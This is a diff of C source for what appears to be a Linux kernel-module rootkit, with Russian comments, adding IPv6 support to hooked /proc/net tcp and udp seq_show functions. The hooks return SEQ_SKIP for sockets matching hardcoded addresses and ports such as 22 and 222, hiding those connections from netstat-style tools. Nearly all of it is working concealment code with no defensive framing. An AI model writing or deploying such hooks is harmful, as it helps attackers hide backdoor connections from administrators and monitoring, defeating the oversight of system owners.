@@ -143,51 +143,78 @@ extern int debug_lvl;
 //     return ret;
 // }
 
+
+
 // -------------------- filter from /proc/net/* -------------------------
+// ==================== Вспомогательные функции =========================
+
 enum Protocols {
     tcp,
     udp
 };
 
-bool is_hide_addr(__be32 saddr, __be32 daddr, enum Protocols protocol);
-bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol);
-bool is_hide_net_info(__be32 saddr, __be32 daddr, __be16 sport, __be16 dport, enum Protocols protocol);
-bool is_skip4_seq_show (void *v, enum Protocols protocol);
+enum IP_type {
+    ipv4,
+    ipv6
+};
 
 struct Extended_array {
     void* array_addr;
     int array_size;
 };
 
-// позже можно будет тип массива на __be32 для адр и __be16 для порт
+/*
+    !Подумать на типом хранения строк с ip
+*/
 char *tcp4_addrs[] = {"15.197.130.177", "0.0.0.0"};
 char *udp4_addrs[] = {"192.168.157.254", "0.0.0.0"};
+char *tcp6_addrs[] = {"::"};
+char *udp6_addrs[] = {"2001:db8::1"};
 struct Extended_array addrs[] = {
     {tcp4_addrs, sizeof(tcp4_addrs) / sizeof(tcp4_addrs[0])}, 
-    {udp4_addrs, sizeof(udp4_addrs) / sizeof(udp4_addrs[0])}
+    {udp4_addrs, sizeof(udp4_addrs) / sizeof(udp4_addrs[0])},
+    {tcp6_addrs, sizeof(tcp6_addrs) / sizeof(tcp6_addrs[0])}, 
+    {udp6_addrs, sizeof(udp6_addrs) / sizeof(udp6_addrs[0])}
 };
 
 int tcp4_ports[] = {22};
 int udp4_ports[] = {67};
+int tcp6_ports[] = {222};
+int udp6_ports[] = {1235};
 struct Extended_array ports[] = {
     {tcp4_ports, sizeof(tcp4_ports) / sizeof(tcp4_ports[0])}, 
-    {udp4_ports, sizeof(udp4_ports) / sizeof(udp4_ports[0])}
+    {udp4_ports, sizeof(udp4_ports) / sizeof(udp4_ports[0])},
+    {tcp6_ports, sizeof(tcp6_ports) / sizeof(tcp6_ports[0])}, 
+    {udp6_ports, sizeof(udp6_ports) / sizeof(udp6_ports[0])}
 };
 
-// in4/6_pton
-// пока реализовано для ipv4
-bool is_hide_addr(__be32 saddr, __be32 daddr, enum Protocols protocol) {
+bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol);
+bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol);
+bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
+bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
+bool is_skip4_seq_show (void *v, enum Protocols protocol);
+bool is_skip6_seq_show (void *v, enum Protocols protocol);
+
+
+/*
+    is_hide4_addr - функция, скрывать или нет ipv4 сокет по адресу источника или адресу назначения
+
+    __be32 *saddr - указатель на адрес источника
+    __be32 *daddr - указатель на адрес назначения
+    enum Protocols protocol - протокол
+*/
+bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol) {
     // надо будет потом добавить проверку на наличие данных в этом массиве
     // пока будем думать, что чтото в нем есть
     __be32 addr;
-    
+
     for (int ip_id = 0; ip_id < addrs[protocol].array_size; ip_id++) {
         if (!in4_pton(((char **)addrs[protocol].array_addr)[ip_id], -1, (u8 *)&addr, '\0', NULL)) {
             pr_err("Err in4_pton\n");
             continue;
         }
 
-        if (saddr == addr || daddr == addr) {
+        if (*saddr == addr || *daddr == addr) {
             return true;
         }    
     }
@@ -195,13 +222,52 @@ bool is_hide_addr(__be32 saddr, __be32 daddr, enum Protocols protocol) {
     return false;
 }
 
-bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol) {
+/*
+    is_hide6_addr - функция, скрывать или нет ipv6 сокет по адресу источника/назначения
+
+    struct in6_addr *saddr - указатель на адрес источника
+    struct in6_addr *daddr - указатель на адрес назначения
+    enum Protocols protocol - протокол
+
+    struct in6_addr - uapi/linux/in6.h
+*/
+bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol) {
+    // надо будет потом добавить проверку на наличие данных в этом массиве
+    // пока будем думать, что чтото в нем есть
+    struct in6_addr addr;
+
+    for (int ip_id = 0; ip_id < addrs[protocol + 2].array_size; ip_id++) {
+        // +2 = расстояние от v4 до v6
+        if (!in6_pton(((char **)addrs[protocol + 2].array_addr)[ip_id], -1, addr.s6_addr, '\0', NULL)) {
+            pr_err("Err in6_pton\n");
+            continue;
+        }
+
+        if (memcmp(saddr, &addr, sizeof(struct in6_addr)) == 0 || 
+            memcmp(daddr, &addr, sizeof(struct in6_addr)) == 0) {
+            return true;
+        }    
+    }
+
+    return false;
+}
+
+/*
+    is_hide_port - функция, скрывать или нет ipv4/6 сокет по порту источника/назначения
+
+    __be16 sport - порт источника
+    __be16 dport - порт назначения
+    enum Protocols protocol - протокол
+    enum IP_type ip_type - версия ip
+*/
+bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
     // надо будет потом добавить проверку на наличие данных в этом массиве
     // пока будем думать, что чтото в нем есть
 
-    for (int port_id = 0; port_id < ports[protocol].array_size; port_id++) {
-        if (sport == htons(((int *)ports[protocol].array_addr)[port_id]) || 
-            dport == htons(((int *)ports[protocol].array_addr)[port_id])) {
+    // 2 * ip_type - если ipv4, то 0. Иначе нужноее смщенеие 2
+    for (int port_id = 0; port_id < ports[protocol + 2 * ip_type].array_size; port_id++) {
+        if (sport == htons(((int *)ports[protocol + 2 * ip_type].array_addr)[port_id]) || 
+            dport == htons(((int *)ports[protocol + 2 * ip_type].array_addr)[port_id])) {
             return true;
         }    
     }
@@ -209,28 +275,74 @@ bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol) {
     return false;
 }
 
-bool is_hide_net_info(__be32 saddr, __be32 daddr, __be16 sport, __be16 dport, enum Protocols protocol) {
+/*
+    is_hide_net_info - функция, скрывать или нет сокет по адрес и порту источника/назначения
+
+    void* saddr - указатель на адрес источника 
+    void* daddr - указатель на адрес назначения
+    __be16 sport - порт источника
+    __be16 dport - порт назначения
+    enum Protocols protocol - протокол
+    enum IP_type ip_type - версия ip
+*/
+bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
     // пока надо подумать над этим
-    if (is_hide_addr(saddr, daddr, protocol) || is_hide_port(sport, dport, protocol)) {
+    if ((ip_type == ipv4 && is_hide4_addr((__be32 *)saddr, (__be32 *)daddr, protocol)) ||
+        (ip_type == ipv6 && is_hide6_addr((struct in6_addr*)saddr, (struct in6_addr*)daddr, protocol)) || 
+        is_hide_port(sport, dport, protocol, ip_type)) {
         return true;
     }
     
     return false;
 }
 
-// struct inet_sock - net/inet_sock.h
+/*
+    is_skip4_seq_show - функция, пропустить или нет ipv4 сокет
+
+    void *v - указатель на данные
+    enum Protocols protocol - протокол
+    
+    struct inet_sock - net/inet_sock.h
+*/
 bool is_skip4_seq_show (void *v, enum Protocols protocol) {
     if (v != SEQ_START_TOKEN) {
         struct sock *sk = (struct sock *)v;
         struct inet_sock *is = inet_sk(sk);
 
-        if (is_hide_net_info(is->inet_saddr, is->inet_daddr, is->inet_sport, is->inet_dport, protocol)) {
+        if (is_hide_net_info(&is->inet_saddr, &is->inet_daddr, is->inet_sport, is->inet_dport, protocol, ipv4)) {
             return true;
         }
     }
 
     return false;
 }
+
+/*
+    is_skip6_seq_show - функция, пропустить или нет ipv6 сокет
+
+    void *v - указатель на данные
+    enum Protocols protocol - протокол
+    
+    linux/ipv6.h     - struct ipv6_pinfo
+    uapi/linux/in6.h - struct in6_addr
+*/
+bool is_skip6_seq_show (void *v, enum Protocols protocol) {
+    if (v != SEQ_START_TOKEN) {
+        struct sock *sk = (struct sock *)v;
+        struct inet_sock *is = inet_sk(sk);
+        struct ipv6_pinfo *np = inet6_sk(sk);
+
+        if (is_hide_net_info(&np->saddr, &sk->sk_v6_daddr, is->inet_sport, is->inet_dport, protocol, ipv6)) {
+            return true;
+        }
+    }
+
+    return false;
+}
+// ======================================================================
+
+
+// ===================== Перехват функций ===============================
 
 static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v)
 {
@@ -254,51 +366,25 @@ static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v)
     return res;
 }
 
+static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    long res = real_tcp6_seq_show(seq, v);
 
-// linux/ipv6.h     - struct ipv6_pinfo
-// uapi/linux/in6.h - struct in6_addr
+    if (is_skip6_seq_show(v, tcp)) {
+        return SEQ_SKIP;
+    }
+    return res;
+}
 
-// надо адаптировать под ipv6
-// static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v)
-// {
-//     long res = real_tcp6_seq_show(seq, v);
+static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v)
+{
+    long res = real_udp6_seq_show(seq, v);
 
-//     if (v != SEQ_START_TOKEN)
-//     {
-//         struct sock *sk = (struct sock *)v;
-//         struct inet_sock *is = inet_sk(sk);
+    if (is_skip6_seq_show(v, udp)) {
+        return SEQ_SKIP;
+    }
 
-//         unsigned short port = htons(22);
+    return res;
+}
 
-//         if (port == is->inet_sport) {
-//             // drop from /proc/net/tcp
-//             return SEQ_SKIP;
-//         }
-//     }
-
-//     return res;
-// }
-
-
-
-
-// static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v)
-// {
-//     long res = real_udp6_seq_show(seq, v);
-
-//     if (v != SEQ_START_TOKEN)
-//     {
-//         struct sock *sk = (struct sock *)v;
-//         struct inet_sock *is = inet_sk(sk);
-
-//         unsigned short port = htons(1000);
-
-//         if (port == is->inet_sport) {
-//             // drop from /proc/net/tcp
-//             return SEQ_SKIP;
-//         }
-//     }
-
-//     return res;
-// }
-
+// ======================================================================
